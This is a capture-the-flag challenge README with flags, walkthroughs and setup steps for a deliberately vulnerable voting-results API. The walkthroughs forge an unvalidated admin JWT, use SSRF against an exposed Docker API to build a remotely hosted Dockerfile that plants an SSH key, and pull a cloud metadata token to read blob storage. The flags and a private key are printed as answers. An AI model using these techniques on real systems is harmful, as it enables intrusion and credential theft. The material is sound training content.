# vibe-management

**Author:** jacksimple

**Category:** *Web / Cloud*

## Description

We've setup a new API for managing access to our voting results. With a bit of vibe coding and Docker it couldn't have been easier to build and deploy. You can even take a look at the code if you like.

### Files

- [main.py](release_files/main.py)

### Host

`http://vibe-management.valverde.vote:8000`

## Part 1 

**CTFd name:** *vibe-management-1*

### CTFd Description
We update the active management key daily. Can you identify what today's key is (provide the GUID).

### Depends on
N/A - There's a "natural" sequence to do this, but it doesn't really matter.

### Flag

<details>
<summary>(expand to read)</summary><br>

`4dc15b91-77bf-4988-a596-57abc188657a`

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

The `get_current_user` function uses `decode_jwt` to extract the user from the JWT, but does no validation. As a result, as long as you pass in a JWT that has a `sub` set as `admin` you can make a request to `http://10.0.2.21:8000/active-key` and get the flag:

`curl 'http://10.0.2.21:8000/active-key' --header 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTc0NDgxOTk5Mn0.q0Le38cRG8Jfw0hYFzbOISqj_Q_xmoh_XFXVvat-qSk' --header 'Content-Type: application/json'`

</details>

## Part 2

**CTFd name:** *vibe-management-2*

### CTFd Description
You've got the GUID, but what's the private key associated to it?

### Depends on
N/A 

### Flag

<details>
<summary>(expand to read)</summary><br>

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCxVXZ8b9KgQ43qXxK2R6AjdA9J/g/lE0k1VjKq7GOXbAAAAJjYS4cw2EuH
MAAAAAtzc2gtZWQyNTUxOQAAACCxVXZ8b9KgQ43qXxK2R6AjdA9J/g/lE0k1VjKq7GOXbA
AAAECxBAqmjbGnxBvADl7spoGOVTk4g4+y0YSuj1+5zr4pe7FVdnxv0qBDjepfErZHoCN0
D0n+D+UTSTVWMqrsY5dsAAAAEXVidW50dUBzaW1wbGUtZGV2AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

There's a ton of different ways you can do this, but the main part is taking advantage of the SSRF that exists in the `fetch-url` functions and the fact that the [Docker API](https://docs.docker.com/reference/api/engine/version/v1.48/) is exposed (you can figure it out with a bit of recon, but there's also a small "hint" in the challenge description about using Docker). One of the things the Docker API lets you do is submit a build using a Dockerfile hosted at a URL. 

For example, this [Dockerfile](solve_files/Dockerfile) adds `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0tRdrX0BD79m5Iq/ih3xXekXurvn7QLfssPE0vLjqs` to the `authorized_keys` file on the host, which will then let you SSH in.

To trigger the build you can make a request like the following:
```
curl 'http://10.0.2.21:8000/fetch-url-post?url=http%3A%2F%2F127%2E0%2E0%2E1%3A2375%2Fbuild%3Fremote%3Dhttp%3A%2F%2F10%2E10%2E10%2E2%3A9000%2FDockerfile%26networkmode%3Dhost%26nocache%3Dtrue%27'
```

Decoded:
```
curl 'http://10.0.2.21:8000/fetch-url-post?url=http://127.0.0.1:2375/build?remote=http://10.10.10.2:9000/Dockerfile&networkmode=host&nocache=true'
```

- `127.0.0.1:2375` - The Docker API
- `http://10.10.10.2:9000/Dockerfile` - Where the Dockerfile you want to build is hosted

Once you're on the host you can find the database [init script](server_files/init-scripts/01-create-tables.sql) (or connect to the Postgres database with the credentials used by `main.py`) and find the private key associated to `4dc15b91-77bf-4988-a596-57abc188657a`.

</details>

## Part 3

**CTFd name:** *vibe-management-3*

### CTFd Description
You've got the key, but can you prove you can access the results? What was the name of the candidate who had a vote count of `25000`?

### Depends on
N/A

### Flag

<details>
<summary>(expand to read)</summary><br>

`Gen. Ramon Esperanza`

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

The big hint is here:
```python
    """
        Fetches content from the provided URL using GET method.
        Returns the content as plain text.
        TODO: Use this to grab: https://ntl2025vibemanagement.blob.core.windows.net/election-results/results.csv
        but for now we can just access that file with the managed identity from vpcadmin@10.0.2.22
    """
```

At this stage, you've got the private key so you can ssh into `vpcadmin@10.0.2.22`. The managed identity associated to `10.0.2.22` will give you access to `https://ntl2025vibemanagement.blob.core.windows.net/election-results/results.csv`.

You can get an access token like:

```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fstorage.azure.com%2F' -H Metadata:true
```

And then use it to fetch the file like this:
```bash
curl "https://ntl2025vibemanagement.blob.core.windows.net/election-results/results.csv" \
  -H "x-ms-version: 2017-11-09" \
  -H "Authorization: Bearer <access token here>"
```

Which will return:
```csv
Candidates,Vote Counts
Esteban de Souza,15000
Arius Perez,12000
Raphael Velasquez,18000
Gen. Ramon Esperanza,25000
Joel Plata,13500
Sofia da Silva,9000
Ana Paula Espinoza,16000
Vera Gomes,11000
Xavier Gonzalez,20000
Pedro Galeano,17500
```

</details>


## Setup instructions
1. Install Docker on the VM:
```bash
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh ./get-docker.sh
```

2. Create the `docker` group and add the user to it:
```bash
sudo groupadd docker
sudo usermod -aG docker $USER
```

3. Enable the `Docker` API:

    i. `sudo systemctl edit docker.service`

    ii. Add this to the top of the file:
    ```
    [Service]
    ExecStart=
    ExecStart=/usr/bin/dockerd -H fd:// -H tcp://127.0.0.1:2375
    ```

    iii. `sudo systemctl daemon-reload`
    
    iv. `sudo systemctl restart docker.service`

4. Copy over the [server_files](server_files) and do a `docker compose up`.
